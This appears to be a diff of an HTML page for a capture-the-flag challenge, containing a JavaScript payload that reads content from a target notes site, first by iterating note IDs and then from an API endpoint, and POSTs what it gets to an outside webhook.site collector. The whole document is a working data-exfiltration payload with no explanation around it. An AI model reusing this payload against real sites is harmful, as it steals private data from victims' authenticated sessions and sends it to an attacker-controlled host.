@@ -1,18 +1,14 @@
 <html>
   <body>
 <script>
-    (async function recupAdminNote() {
+    (async function recupAdmininfo() {
             var res;
-            for (let i = 0; i < 1000; i++) {
-                var note = await fetch(`https://xnotes.qualif.hackerlab.bj/note.php?id=${i}`);
-                if (note.status == 200) {
-                    var text = await note.text();
-                    res = {
-                        body: text,
-                    };
-                    break;
-                }
-           }
+            var info = await fetch(`https://xnotes.qualif.hackerlab.bj/api.php`);
+
+            var text = await info.text();
+            res = {
+                    body: text,
+            };
             var jsonData = JSON.stringify(res);
             var req = await fetch("https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492", {
                     method: 'POST',
@@ -24,5 +20,6 @@
     
     })();
     </script>
+</html>
   </body>
 </html>
